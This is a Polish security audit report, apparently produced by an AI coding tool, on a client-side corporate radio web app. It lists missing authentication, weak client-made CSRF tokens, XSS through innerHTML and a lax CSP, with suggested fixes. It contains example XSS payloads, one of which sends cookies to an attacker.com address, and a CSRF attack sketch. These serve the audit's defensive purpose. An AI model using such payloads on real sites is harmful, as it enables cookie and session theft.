# Raport Audytu Bezpieczeństwa - Daremon NAS
**Data:** 2025-11-14
**Audytor:** Claude Code Security Audit
**Zakres:** Kompleksowa analiza OWASP Top 10 (2021) + Dependencies + Input Validation

---

## 📋 Podsumowanie Wykonawcze (Executive Summary)

Daremon NAS to aplikacja Progressive Web App (PWA) pełniąca funkcję korporacyjnego radia internetowego dla zespołu DAREMON ETS. Aplikacja działa w całości po stronie klienta, bez backendu (opcjonalny backend możliwy do podłączenia).

### 🚨 KRYTYCZNE Zagrożenia (TOP 3):

1. **Brak systemu uwierzytelniania i autoryzacji** - Każdy użytkownik ma pełny, nieograniczony dostęp do wszystkich danych i funkcjonalności aplikacji, w tym wrażliwych danych ankiet pracowniczych.

2. **Content Security Policy z 'unsafe-inline'** - Polityka CSP zawiera dyrektywy 'unsafe-inline' dla skryptów i stylów, co w połączeniu z użyciem innerHTML w kilku miejscach stwarza WYSOKIE ryzyko ataków XSS.

3. **Brak szyfrowania danych lokalnych** - Wszystkie dane użytkowników (odpowiedzi na ankiety, preferencje, oceny utworów) przechowywane są w localStorage w postaci zwykłego tekstu, dostępne przez DevTools przeglądarki.

### 📊 Statystyki:

- **Podatności Krytyczne:** 5
- **Podatności Wysokie:** 7
- **Podatności Średnie:** 8
- **Podatności Niskie:** 5
- **Zależności z CVE:** 5 (3 moderate, 2 low)
- **Pliki z problemami:** ~15 plików kluczowych

---

## 🎯 Ranking Zagrożeń

| # | Luka (Problem) | Lokalizacja (Plik/Funkcja) | Poziom Krytyczności | Sugerowana Naprawa |
|---|----------------|---------------------------|---------------------|-------------------|
| 1 | Brak uwierzytelniania użytkowników | Cała aplikacja | **KRYTYCZNY** | Implementacja OAuth2/JWT auth system |
| 2 | CSP z 'unsafe-inline' | `.htaccess:30` | **KRYTYCZNY** | Usunięcie 'unsafe-inline', użycie nonces |
| 3 | Dane w localStorage bez szyfrowania | `app.js`, `employee-survey.js`, `offline-queue.js` | **KRYTYCZNY** | Implementacja Web Crypto API do szyfrowania |
| 4 | Tokeny CSRF generowane po stronie klienta | `survey-api.js:74-89` | **KRYTYCZNY** | Backend z generowaniem tokenów CSRF |
| 5 | Brak kontroli dostępu do wyników ankiet | `employee-survey.js:258-273` | **KRYTYCZNY** | Dodanie uwierzytelniania przed wyświetleniem |
| 6 | Potencjalne XSS poprzez innerHTML | `app.js:1425`, `employee-survey.js:268,440` | **WYSOKI** | Użycie textContent lub DOMPurify |
| 7 | Brak HTTPS enforcement | `.htaccess:37-41` (zakomentowane) | **WYSOKI** | Odkomentowanie i wymuszenie HTTPS |
| 8 | Brak HSTS headers | `.htaccess:11` (zakomentowane) | **WYSOKI** | Włączenie HSTS z preload |
| 9 | Console logs w produkcji | `app.js`, `survey-api.js` (50+ wystąpień) | **WYSOKI** | Usunięcie/warunkowe logowanie |
| 10 | Podatności w Vite 6.3.5 | `package.json:20` | **WYSOKI** | Aktualizacja do Vite 6.4.1+ |
| 11 | Podatność w esbuild 0.21.5 | Zależność transitywna | **ŚREDNI** | Aktualizacja Vite (pociągnie esbuild) |
| 12 | Słaba walidacja inputu | `employee-survey.js:67-75`, `granulate-survey.js:96-111` | **ŚREDNI** | Dodanie regex validation, sanityzacji |
| 13 | Brak rate limiting | API endpoints (`survey-api.js`) | **ŚREDNI** | Implementacja rate limiting na backendzie |
| 14 | Nieselektywne użycie escapeHtml | `employee-survey.js`, `granulate-survey.js` | **ŚREDNI** | Konsekwentna sanityzacja wszędzie |
| 15 | Brak walidacji długości inputu | Większość formularzy | **ŚREDNI** | Dodanie maxlength i backend validation |
| 16 | Exposure błędów HTTP | `survey-api.js:188-194` | **ŚREDNI** | Generyczne komunikaty dla użytkownika |
| 17 | Brak Content-Type validation | `survey-api.js:175-184` | **ŚREDNI** | Walidacja Content-Type w zapytaniach |
| 18 | Stack traces w console.error | Wiele plików | **ŚREDNI** | Ukrycie szczegółów w produkcji |
| 19 | Brak subresource integrity | `index.html` (GSAP CDN) | **NISKI** | Dodanie SRI dla zewnętrznych skryptów |
| 20 | Brak sanityzacji URL params | `app.js`, routing | **NISKI** | Walidacja URL params przed użyciem |
| 21 | Mixed content w CSP | `.htaccess:30` (img-src https:) | **NISKI** | Ograniczenie do konkretnych domen |
| 22 | Brak X-Download-Options | `.htaccess` | **NISKI** | Dodanie header X-Download-Options |
| 23 | Brak Expect-CT header | `.htaccess` | **NISKI** | Opcjonalne: dodanie Expect-CT |

---

## 🔍 Szczegółowa Analiza OWASP Top 10

### A01:2021 - Broken Access Control ⚠️ **KRYTYCZNY**

#### 1.1 Brak systemu uwierzytelniania
**Lokalizacja:** Cała aplikacja
**Poziom:** **KRYTYCZNY**

**Problem:**
Aplikacja nie posiada żadnego systemu uwierzytelniania ani autoryzacji. Każdy użytkownik ma pełny dostęp do:
- Wyników ankiet pracowniczych (dane osobowe, opinie)
- Zapisanych danych w localStorage innych użytkowników (jeśli mają dostęp do urządzenia)
- Wszystkich funkcji aplikacji bez rozróżnienia ról

**Fragment kodu:**
```javascript
// employee-survey.js:258-273
function showEmployeeSurveyResults() {
    const responses = getEmployeeSurveyResponses(); // Brak sprawdzenia uprawnień!
    const resultsDiv = document.getElementById('employee-survey-results');
    const contentDiv = document.getElementById('employee-survey-results-content');

    if (!resultsDiv || !contentDiv) return;

    if (responses.length === 0) {
        contentDiv.innerHTML = '<p class="no-results">Brak odpowiedzi. Bądź pierwszy!</p>';
    } else {
        contentDiv.innerHTML = generateEmployeeResultsHTML(responses); // Każdy widzi wszystkie odpowiedzi!
    }
    // ...
}
```

**Ryzyko:**
- **Poufność:** Wysoka - wrażliwe dane pracownicze dostępne dla każdego
- **Integralność:** Wysoka - brak ochrony przed modyfikacją danych
- **Dostępność:** Średnia - brak mechanizmów przeciw abuse

**Sugerowana naprawa:**
```javascript
// 1. Dodanie systemu autoryzacji (backend)
async function showEmployeeSurveyResults() {
    try {
        // Sprawdzenie uprawnień na backendzie
        const authResponse = await fetch('/api/v1/auth/check', {
            method: 'GET',
            credentials: 'include',
            headers: {
                'Authorization': `Bearer ${getAuthToken()}`
            }
        });

        if (!authResponse.ok || !authResponse.json().hasPermission('view_survey_results')) {
            throw new Error('Brak uprawnień');
        }

        // Pobieranie danych z backendu (nie z localStorage!)
        const responses = await fetchSurveyResultsFromBackend();
        renderResults(responses);

    } catch (error) {
        showError('Nie masz uprawnień do przeglądania wyników ankiet.');
        console.error('Authorization failed:', error);
    }
}

// 2. Funkcja pobierania tokenu (przykład)
function getAuthToken() {
    // Token powinien być przechowywany w httpOnly cookie (bezpieczniej)
    // lub w sessionStorage z krótkim TTL
    return sessionStorage.getItem('auth_token');
}
```

**Priorytet:** **P0 - Natychmiastowy**

---

#### 1.2 Publiczny dostęp do localStorage
**Lokalizacja:** `app.js:487`, `employee-survey.js:215,228`, `offline-queue.js:117,130`
**Poziom:** **KRYTYCZNY**

**Problem:**
Wszystkie dane użytkownika przechowywane w localStorage są dostępne przez:
- DevTools przeglądarki (F12 → Application → Local Storage)
- Skrypty JavaScript uruchomione na tej samej domenie
- Ataki XSS (jeśli występują)

**Fragment kodu:**
```javascript
// employee-survey.js:210-221
function saveEmployeeSurveyResponse(response) {
    try {
        const responses = getEmployeeSurveyResponses();
        responses.push(response); // Brak walidacji, kto może zapisać
        localStorage.setItem(EMPLOYEE_SURVEY_STORAGE_KEY, JSON.stringify(responses)); // Plain text!
        console.log('✅ Odpowiedź ankiety pracowniczej zapisana');
    } catch (error) {
        console.error('❌ Błąd zapisywania odpowiedzi:', error); // Stack trace w konsoli
        alert('Nie udało się zapisać ankiety. Spróbuj ponownie.');
    }
}
```

**Przykładowe dane w localStorage:**
```json
{
  "daremon_employee_survey_responses": "[{
    \"timestamp\": \"2025-11-14T10:30:00.000Z\",
    \"name\": \"Jan Kowalski\",
    \"teamContinuation\": \"yes\",
    \"ideas\": \"Mam pomysł na nową funkcję...\"
  }]"
}
```

**Ryzyko:**
- Każdy z dostępem fizycznym do urządzenia może odczytać WSZYSTKIE dane
- Brak ochrony przed przeglądaniem danych przez ciekawskich współpracowników
- Dane nie są usuwane po wylogowaniu (brak wylogowania!)

**Sugerowana naprawa:**
```javascript
// 1. Szyfrowanie danych w localStorage (Web Crypto API)
class SecureStorage {
    constructor(encryptionKey) {
        this.key = encryptionKey;
    }

    async encrypt(data) {
        const encoder = new TextEncoder();
        const dataBuffer = encoder.encode(JSON.stringify(data));

        const iv = crypto.getRandomValues(new Uint8Array(12));

        const encryptedData = await crypto.subtle.encrypt(
            { name: 'AES-GCM', iv: iv },
            this.key,
            dataBuffer
        );

        // Kombinacja IV + encrypted data
        const result = new Uint8Array(iv.length + encryptedData.byteLength);
        result.set(iv, 0);
        result.set(new Uint8Array(encryptedData), iv.length);

        return btoa(String.fromCharCode(...result));
    }

    async decrypt(encryptedString) {
        const encryptedData = Uint8Array.from(atob(encryptedString), c => c.charCodeAt(0));

        const iv = encryptedData.slice(0, 12);
        const data = encryptedData.slice(12);

        const decryptedBuffer = await crypto.subtle.decrypt(
            { name: 'AES-GCM', iv: iv },
            this.key,
            data
        );

        const decoder = new TextDecoder();
        return JSON.parse(decoder.decode(decryptedBuffer));
    }

    async setItem(key, value) {
        const encrypted = await this.encrypt(value);
        localStorage.setItem(key, encrypted);
    }

    async getItem(key) {
        const encrypted = localStorage.getItem(key);
        if (!encrypted) return null;
        return await this.decrypt(encrypted);
    }
}

// Użycie:
const storage = new SecureStorage(await generateEncryptionKey());
await storage.setItem('survey_responses', responses);

// 2. LEPSZE ROZWIĄZANIE: Przeniesienie danych na backend
async function saveSurveyResponse(response) {
    const result = await fetch('/api/v1/surveys/employee', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${getAuthToken()}`
        },
        body: JSON.stringify(response)
    });

    if (!result.ok) {
        throw new Error('Failed to save survey');
    }

    return result.json();
}
```

**Priorytet:** **P0 - Natychmiastowy**

---

### A02:2021 - Cryptographic Failures ⚠️ **KRYTYCZNY**

#### 2.1 Tokeny CSRF generowane po stronie klienta
**Lokalizacja:** `survey-api.js:74-89`
**Poziom:** **KRYTYCZNY**

**Problem:**
Tokeny CSRF są generowane po stronie klienta za pomocą prostej funkcji hash, która NIE zapewnia żadnej ochrony przed atakami CSRF. Atakujący może z łatwością odtworzyć ten token.

**Fragment kodu:**
```javascript
// survey-api.js:74-89
function generateClientToken() {
    const timestamp = Date.now();
    const random = Math.random().toString(36).substring(2, 15); // Math.random() NIE jest kryptograficznie bezpieczny!
    const userAgent = navigator.userAgent.substring(0, 50);
    const combined = `${timestamp}-${random}-${userAgent}`;

    // Simple hash function - NOT cryptographically secure
    let hash = 0;
    for (let i = 0; i < combined.length; i++) {
        const char = combined.charCodeAt(i);
        hash = ((hash << 5) - hash) + char;
        hash = hash & hash; // Convert to 32bit integer
    }

    return `client-${Math.abs(hash).toString(36)}-${timestamp}`; // PRZEWIDYWALNY!
}
```

**Dlaczego to jest złe:**
1. `Math.random()` nie jest kryptograficznie bezpieczne
2. Timestamp jest publiczny i przewidywalny
3. User-Agent jest znany atakującemu
4. Prosta funkcja hash jest łatwa do odtworzenia
5. Token generowany po stronie klienta = atakujący może wygenerować taki sam token

**Atak:**
```javascript
// Atakujący na stronie evil.com
const maliciousForm = document.createElement('form');
maliciousForm.action = 'https://daremon.nl/api/v1/surveys/employee';
maliciousForm.method = 'POST';

// Odtworzenie tokenu (dokładnie tak samo jak w aplikacji)
const timestamp = Date.now();
const random = Math.random().toString(36).substring(2, 15);
const userAgent = navigator.userAgent.substring(0, 50);
const csrfToken = generateSameTokenAsApp(timestamp, random, userAgent);

// Wysłanie złośliwego zapytania
fetch('https://daremon.nl/api/v1/surveys/employee', {
    method: 'POST',
    headers: {
        'X-CSRF-Token': csrfToken // Token wygenerowany przez atakującego!
    },
    body: JSON.stringify({ maliciousData: '...' })
});
```

**Sugerowana naprawa:**
```javascript
// BACKEND (Node.js + Express przykład)
const crypto = require('crypto');
const session = require('express-session');

// 1. Generowanie tokenu CSRF na serwerze
app.use(session({
    secret: process.env.SESSION_SECRET, // Silny, losowy sekret
    resave: false,
    saveUninitialized: false,
    cookie: {
        httpOnly: true,
        secure: true, // Tylko HTTPS
        sameSite: 'strict'
    }
}));

app.get('/api/v1/csrf-token', (req, res) => {
    // Token generowany z użyciem crypto (kryptograficznie bezpieczny)
    const csrfToken = crypto.randomBytes(32).toString('hex');

    // Przechowywanie w sesji serwera
    req.session.csrfToken = csrfToken;

    res.json({ token: csrfToken });
});

// 2. Walidacja tokenu na serwerze
app.post('/api/v1/surveys/employee', (req, res) => {
    const receivedToken = req.headers['x-csrf-token'];
    const sessionToken = req.session.csrfToken;

    if (!receivedToken || receivedToken !== sessionToken) {
        return res.status(403).json({ error: 'Invalid CSRF token' });
    }

    // Token poprawny - przetwarzamy zapytanie
    // ...
});

// FRONTEND
async function getCsrfToken() {
    const response = await fetch('/api/v1/csrf-token', {
        credentials: 'include' // Wysyła cookie sesji
    });
    const data = await response.json();
    return data.token;
}
```

**Priorytet:** **P0 - Natychmiastowy** (wymaga backendu)

---

#### 2.2 Brak HTTPS enforcement
**Lokalizacja:** `.htaccess:37-41`
**Poziom:** **WYSOKI**

**Problem:**
Kod wymuszający HTTPS jest zakomentowany, co oznacza, że aplikacja może być serwowana przez HTTP. To pozwala na ataki Man-in-the-Middle (MITM).

**Fragment kodu:**
```apache
# .htaccess:37-41
# <IfModule mod_rewrite.c>
#     RewriteEngine On
#     RewriteCond %{HTTPS} off
#     RewriteRule ^(.*)$ https://%{HTTP_HOST}%{REQUEST_URI} [L,R=301]
# </IfModule>
```

**Ryzyko:**
- Atakujący w tej samej sieci WiFi może przechwycić dane użytkownika
- Session hijacking (jeśli backend używa cookies)
- Modyfikacja treści podczas transmisji

**Sugerowana naprawa:**
```apache
# .htaccess
<IfModule mod_rewrite.c>
    RewriteEngine On

    # Wymuszenie HTTPS
    RewriteCond %{HTTPS} off
    RewriteRule ^(.*)$ https://%{HTTP_HOST}%{REQUEST_URI} [L,R=301]
</IfModule>

<IfModule mod_headers.c>
    # HSTS - wymuszenie HTTPS przez 1 rok
    Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains; preload"
</IfModule>
```

**Dodatkowo - rejestracja w HSTS preload list:**
https://hstspreload.org/

**Priorytet:** **P1 - Wysoki**

---

### A03:2021 - Injection (XSS) ⚠️ **WYSOKI**

#### 3.1 Potencjalne XSS poprzez innerHTML
**Lokalizacja:** `app.js:1425`, `employee-survey.js:268,440`, `granulate-survey.js:314`
**Poziom:** **WYSOKI**

**Problem:**
Aplikacja używa `innerHTML` w kilku miejscach, w tym do wyświetlania treści pochodzących od użytkowników. Choć w niektórych miejscach używana jest funkcja `escapeHtml()`, nie jest to konsekwentne.

**Fragment kodu - PROBLEM:**
```javascript
// app.js:1425
function addMessage(author, text, isAI = false) {
    state.messages.push({ author, text, isAI, timestamp: new Date().toLocaleTimeString() });
    renderMessages();
}

function renderMessages() {
    dom.sidePanel.messagesList.innerHTML = '';
    state.messages.forEach(msg => {
        const li = document.createElement('li');
        li.className = msg.isAI ? 'ai-message' : 'user-message';
        li.innerHTML = `<b>${msg.author}:</b> ${msg.text} <i>(${msg.timestamp})</i>`; // XSS!
        dom.sidePanel.messagesList.appendChild(li);
    });
}
```

**Atak:**
```javascript
// Użytkownik wpisuje w pole "author" lub "text":
const maliciousInput = '<img src=x onerror="alert(document.cookie)">';

// Kod wykonuje:
li.innerHTML = `<b>${maliciousInput}:</b> ...`; // EXPLOIT!
```

**Fragment kodu - DOBRE (używa escapeHtml):**
```javascript
// employee-survey.js:467-471
function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text; // textContent automatycznie escapuje
    return div.innerHTML;
}

// employee-survey.js:439-440
<strong>${escapeHtml(r.name)}</strong>
<p>${escapeHtml(r.ideas)}</p>
```

**Sugerowana naprawa:**
```javascript
// OPCJA 1: Użycie textContent zamiast innerHTML (najlepsze)
function renderMessages() {
    dom.sidePanel.messagesList.innerHTML = '';
    state.messages.forEach(msg => {
        const li = document.createElement('li');
        li.className = msg.isAI ? 'ai-message' : 'user-message';

        const authorBold = document.createElement('b');
        authorBold.textContent = msg.author; // Bezpieczne

        const textSpan = document.createElement('span');
        textSpan.textContent = msg.text; // Bezpieczne

        const timeItalic = document.createElement('i');
        timeItalic.textContent = `(${msg.timestamp})`;

        li.appendChild(authorBold);
        li.appendChild(document.createTextNode(': '));
        li.appendChild(textSpan);
        li.appendChild(document.createTextNode(' '));
        li.appendChild(timeItalic);

        dom.sidePanel.messagesList.appendChild(li);
    });
}

// OPCJA 2: DOMPurify (jeśli potrzebny HTML)
// npm install dompurify
import DOMPurify from 'dompurify';

function renderMessages() {
    dom.sidePanel.messagesList.innerHTML = '';
    state.messages.forEach(msg => {
        const li = document.createElement('li');
        li.className = msg.isAI ? 'ai-message' : 'user-message';

        const sanitizedHTML = DOMPurify.sanitize(
            `<b>${msg.author}:</b> ${msg.text} <i>(${msg.timestamp})</i>`
        );
        li.innerHTML = sanitizedHTML;

        dom.sidePanel.messagesList.appendChild(li);
    });
}
```

**Priorytet:** **P1 - Wysoki**

---

#### 3.2 CSP z 'unsafe-inline'
**Lokalizacja:** `.htaccess:30`
**Poziom:** **KRYTYCZNY**

**Problem:**
Content Security Policy zawiera dyrektywy `'unsafe-inline'` dla `script-src` i `style-src`, co całkowicie neguje ochronę przed XSS.

**Fragment kodu:**
```apache
# .htaccess:30
Header set Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; ..."
```

**Dlaczego to jest złe:**
`'unsafe-inline'` pozwala na wykonanie KAŻDEGO inline skryptu, w tym wstrzykniętego przez XSS:
```html
<!-- Atakujący wstrzykuje: -->
<img src=x onerror="fetch('https://attacker.com/steal?cookie=' + document.cookie)">
<!-- CSP z 'unsafe-inline' to przepuści! -->
```

**Sugerowana naprawa:**
```apache
# .htaccess - POPRAWIONE CSP
<IfModule mod_headers.c>
    # CSP z nonces (wymaga generowania nonce w aplikacji)
    Header set Content-Security-Policy "default-src 'self'; script-src 'self' 'nonce-{RANDOM_NONCE}' https://cdnjs.cloudflare.com; style-src 'self' 'nonce-{RANDOM_NONCE}' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: https:; media-src 'self'; connect-src 'self'; frame-ancestors 'none'; base-uri 'self'; form-action 'self'"
</IfModule>
```

**W HTML (generowanie nonce):**
```html
<!-- Backend musi generować losowy nonce dla każdego requestu -->
<script nonce="A7B3C9D1E5F2">
    // Inline script z nonce
    console.log('This is allowed');
</script>

<!-- Skrypt bez nonce ZABLOKOWANY przez CSP -->
<script>
    alert('XSS attempt - BLOCKED!');
</script>
```

**Dla aplikacji bez backendu (CSP tylko dla zewnętrznych źródeł):**
```apache
# Minimalne CSP bez 'unsafe-inline' - wymaga przeniesienia wszystkich inline scripts do plików .js
Header set Content-Security-Policy "default-src 'self'; script-src 'self' https://cdnjs.cloudflare.com; style-src 'self' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: https:; media-src 'self'; connect-src 'self'; object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'; upgrade-insecure-requests"
```

**Wymagane zmiany w kodzie:**
1. Przenieś wszystkie inline `<script>` do zewnętrznych plików
2. Przenieś wszystkie inline `<style>` do zewnętrznych plików CSS
3. Usuń wszystkie atrybuty event handlers (onclick, onerror, etc.) - zastąp addEventListener

**Priorytet:** **P0 - Krytyczny**

---

### A07:2021 - Identification and Authentication Failures ⚠️ **KRYTYCZNY**

#### 7.1 Całkowity brak systemu uwierzytelniania
**Lokalizacja:** Cała aplikacja
**Poziom:** **KRYTYCZNY**

**Problem:**
Aplikacja nie posiada żadnego mechanizmu:
- Logowania użytkowników
- Sesji użytkownika
- Rozróżnienia użytkowników
- Zarządzania hasłami
- Odzyskiwania dostępu

**Sugerowana naprawa - Opcja 1: OAuth2 / OpenID Connect (zalecane dla aplikacji korporacyjnej):**

```javascript
// auth.js
class AuthService {
    constructor() {
        this.authEndpoint = 'https://auth.daremon.nl/oauth2/authorize';
        this.tokenEndpoint = 'https://auth.daremon.nl/oauth2/token';
        this.clientId = 'daremon-nas-client';
    }

    async login() {
        // 1. Redirect do providera OAuth2 (np. Azure AD, Okta, Auth0)
        const state = this.generateState();
        const codeVerifier = this.generateCodeVerifier();
        const codeChallenge = await this.generateCodeChallenge(codeVerifier);

        // Zapisz state i verifier w sessionStorage
        sessionStorage.setItem('oauth_state', state);
        sessionStorage.setItem('code_verifier', codeVerifier);

        const authUrl = new URL(this.authEndpoint);
        authUrl.searchParams.set('client_id', this.clientId);
        authUrl.searchParams.set('redirect_uri', window.location.origin + '/callback');
        authUrl.searchParams.set('response_type', 'code');
        authUrl.searchParams.set('scope', 'openid profile email');
        authUrl.searchParams.set('state', state);
        authUrl.searchParams.set('code_challenge', codeChallenge);
        authUrl.searchParams.set('code_challenge_method', 'S256');

        window.location.href = authUrl.toString();
    }

    async handleCallback() {
        const urlParams = new URLSearchParams(window.location.search);
        const code = urlParams.get('code');
        const state = urlParams.get('state');

        // Weryfikacja state
        const savedState = sessionStorage.getItem('oauth_state');
        if (state !== savedState) {
            throw new Error('Invalid state parameter');
        }

        // Wymiana code na token
        const codeVerifier = sessionStorage.getItem('code_verifier');
        const tokenResponse = await fetch(this.tokenEndpoint, {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams({
                grant_type: 'authorization_code',
                code: code,
                redirect_uri: window.location.origin + '/callback',
                client_id: this.clientId,
                code_verifier: codeVerifier
            })
        });

        const tokens = await tokenResponse.json();

        // Zapisz token (w httpOnly cookie przez backend byłoby bezpieczniej)
        this.setTokens(tokens);

        // Cleanup
        sessionStorage.removeItem('oauth_state');
        sessionStorage.removeItem('code_verifier');

        return tokens;
    }

    setTokens(tokens) {
        // UWAGA: sessionStorage to kompromis - httpOnly cookie byłoby bezpieczniejsze
        sessionStorage.setItem('access_token', tokens.access_token);
        sessionStorage.setItem('id_token', tokens.id_token);

        if (tokens.refresh_token) {
            sessionStorage.setItem('refresh_token', tokens.refresh_token);
        }
    }

    getAccessToken() {
        return sessionStorage.getItem('access_token');
    }

    isAuthenticated() {
        const token = this.getAccessToken();
        if (!token) return false;

        // Sprawdź czy token nie wygasł
        const payload = this.parseJWT(token);
        return payload.exp * 1000 > Date.now();
    }

    logout() {
        sessionStorage.removeItem('access_token');
        sessionStorage.removeItem('id_token');
        sessionStorage.removeItem('refresh_token');
        window.location.href = '/';
    }

    parseJWT(token) {
        const base64Url = token.split('.')[1];
        const base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
        return JSON.parse(atob(base64));
    }

    generateState() {
        return this.generateRandomString(32);
    }

    generateCodeVerifier() {
        return this.generateRandomString(64);
    }

    async generateCodeChallenge(verifier) {
        const encoder = new TextEncoder();
        const data = encoder.encode(verifier);
        const hash = await crypto.subtle.digest('SHA-256', data);
        return this.base64UrlEncode(hash);
    }

    generateRandomString(length) {
        const array = new Uint8Array(length);
        crypto.getRandomValues(array);
        return Array.from(array, byte => byte.toString(16).padStart(2, '0')).join('');
    }

    base64UrlEncode(buffer) {
        const bytes = new Uint8Array(buffer);
        let binary = '';
        for (let i = 0; i < bytes.byteLength; i++) {
            binary += String.fromCharCode(bytes[i]);
        }
        return btoa(binary)
            .replace(/\+/g, '-')
            .replace(/\//g, '_')
            .replace(/=/g, '');
    }
}

// Użycie:
const auth = new AuthService();

// W app.js - sprawdzenie auth przed inicjalizacją
async function initialize() {
    if (!auth.isAuthenticated()) {
        // Przekierowanie do logowania
        await auth.login();
        return;
    }

    // Aplikacja załadowana tylko dla zalogowanych użytkowników
    await loadPlaylist();
    setupEventListeners();
    // ...
}
```

**Opcja 2: Własny backend z JWT (prostsze, ale wymaga więcej pracy):**

```javascript
// Backend (Node.js)
const jwt = require('jsonwebtoken');
const bcrypt = require('bcrypt');

app.post('/api/v1/auth/login', async (req, res) => {
    const { username, password } = req.body;

    // Znajdź użytkownika w bazie danych
    const user = await db.users.findOne({ username });
    if (!user) {
        return res.status(401).json({ error: 'Invalid credentials' });
    }

    // Weryfikacja hasła (bcrypt)
    const isValid = await bcrypt.compare(password, user.passwordHash);
    if (!isValid) {
        return res.status(401).json({ error: 'Invalid credentials' });
    }

    // Generowanie JWT
    const token = jwt.sign(
        { userId: user.id, username: user.username, role: user.role },
        process.env.JWT_SECRET,
        { expiresIn: '1h' }
    );

    res.json({ token, user: { id: user.id, username: user.username } });
});

// Middleware weryfikacji JWT
function authenticateToken(req, res, next) {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1]; // Bearer TOKEN

    if (!token) {
        return res.status(401).json({ error: 'No token provided' });
    }

    jwt.verify(token, process.env.JWT_SECRET, (err, user) => {
        if (err) {
            return res.status(403).json({ error: 'Invalid token' });
        }
        req.user = user;
        next();
    });
}

// Użycie middleware
app.get('/api/v1/surveys/employee/results', authenticateToken, async (req, res) => {
    // req.user zawiera dane użytkownika z JWT

    // Sprawdzenie uprawnień
    if (req.user.role !== 'admin' && req.user.role !== 'manager') {
        return res.status(403).json({ error: 'Insufficient permissions' });
    }

    const results = await db.surveys.find({});
    res.json(results);
});
```

**Priorytet:** **P0 - Krytyczny**

---

## 🛡️ Obsługa Błędów i Wyciek Informacji

### 4.1 Console logs w produkcji
**Lokalizacja:** `app.js`, `survey-api.js`, `offline-queue.js` (50+ wystąpień)
**Poziom:** **WYSOKI**

**Problem:**
Aplikacja zawiera liczne `console.log()`, `console.error()`, `console.warn()` które ujawniają:
- Stack traces błędów
- Szczegóły implementacji
- Informacje o strukturze kodu
- Dane użytkownika (w niektórych przypadkach)

**Przykłady:**
```javascript
// app.js:441
console.error("Initialisatie mislukt:", error); // Stack trace w konsoli!

// survey-api.js:117
console.log('📦 Backend disabled - saving to localStorage only');

// survey-api.js:332
console.log('⚙️ API config updated:', API_CONFIG); // Cała konfiguracja API!

// employee-survey.js:218
console.error('❌ Błąd zapisywania odpowiedzi:', error); // Błąd z detailami
```

**Ryzyko:**
- Ujawnienie wewnętrznej logiki aplikacji
- Ułatwienie reverse engineeringu
- Potencjalne ujawnienie danych użytkownika
- Pomoc atakującemu w znajdowaniu podatności

**Sugerowana naprawa:**
```javascript
// logger.js - Nowy moduł logowania
class Logger {
    constructor() {
        this.isProduction = window.location.hostname === 'daremon.nl';
        this.logLevel = this.isProduction ? 'error' : 'debug';
    }

    debug(...args) {
        if (this.logLevel === 'debug') {
            console.log('[DEBUG]', ...args);
        }
    }

    info(...args) {
        if (this.logLevel !== 'none') {
            console.info('[INFO]', ...args);
        }
    }

    warn(...args) {
        if (this.logLevel !== 'none') {
            console.warn('[WARN]', ...args);
        }
    }

    error(...args) {
        if (this.isProduction) {
            // W produkcji - tylko generyczny komunikat, szczegóły do error trackingu
            console.error('[ERROR] An error occurred');
            this.sendToErrorTracking(args);
        } else {
            console.error('[ERROR]', ...args);
        }
    }

    sendToErrorTracking(errorData) {
        // Wysyłka do Sentry, LogRocket, etc.
        if (window.Sentry) {
            Sentry.captureException(errorData);
        }
    }
}

const logger = new Logger();
export default logger;

// Użycie w aplikacji:
// Zamiast: console.log('📦 Backend disabled');
// Użyj: logger.debug('Backend disabled - saving to localStorage only');

// Zamiast: console.error('Błąd:', error);
// Użyj: logger.error('Failed to save response', error);
```

**Build-time removal (Vite):**
```javascript
// vite.config.js
import { defineConfig } from 'vite';

export default defineConfig({
    // ...
    esbuild: {
        drop: process.env.NODE_ENV === 'production' ? ['console', 'debugger'] : [],
    },
});
```

**Priorytet:** **P1 - Wysoki**

---

### 4.2 Exposure szczegółów błędów HTTP
**Lokalizacja:** `survey-api.js:188-194`
**Poziom:** **ŚREDNI**

**Problem:**
Błędy HTTP są przekazywane użytkownikowi ze szczegółami z backendu.

**Fragment kodu:**
```javascript
// survey-api.js:186-196
if (!response.ok) {
    // Parse error message
    let errorMessage = `HTTP ${response.status}`; // Status HTTP ujawniony
    try {
        const errorData = await response.json();
        errorMessage = errorData.message || errorMessage; // Komunikat z backendu
    } catch (e) {
        errorMessage = await response.text() || errorMessage; // Cała treść odpowiedzi!
    }

    throw new Error(errorMessage); // Użytkownik widzi szczegóły
}
```

**Ryzyko:**
- Ujawnienie szczegółów backendu (framework, wersje)
- Stack traces z backendu widoczne dla użytkownika
- Pomoc atakującemu w mapowaniu aplikacji

**Sugerowana naprawa:**
```javascript
// survey-api.js - POPRAWIONE
if (!response.ok) {
    // Logowanie szczegółów dla deweloperów
    let errorDetails = `HTTP ${response.status}`;
    try {
        const errorData = await response.json();
        errorDetails = errorData.message || errorDetails;
        logger.error('API request failed:', {
            status: response.status,
            endpoint: endpoint,
            details: errorData
        });
    } catch (e) {
        logger.error('API request failed:', {
            status: response.status,
            endpoint: endpoint
        });
    }

    // Generyczny komunikat dla użytkownika
    const userMessage = getUserFriendlyErrorMessage(response.status);
    throw new Error(userMessage);
}

function getUserFriendlyErrorMessage(status) {
    const messages = {
        400: 'Nieprawidłowe dane formularza. Sprawdź wprowadzone informacje.',
        401: 'Sesja wygasła. Zaloguj się ponownie.',
        403: 'Brak uprawnień do wykonania tej operacji.',
        404: 'Nie znaleziono zasobu.',
        429: 'Zbyt wiele zapytań. Spróbuj ponownie za chwilę.',
        500: 'Wystąpił błąd serwera. Spróbuj ponownie później.',
        503: 'Serwis tymczasowo niedostępny. Spróbuj ponownie później.'
    };

    return messages[status] || 'Wystąpił nieoczekiwany błąd. Skontaktuj się z administratorem.';
}
```

**Priorytet:** **P2 - Średni**

---

## 📦 Analiza Zależności (Dependencies)

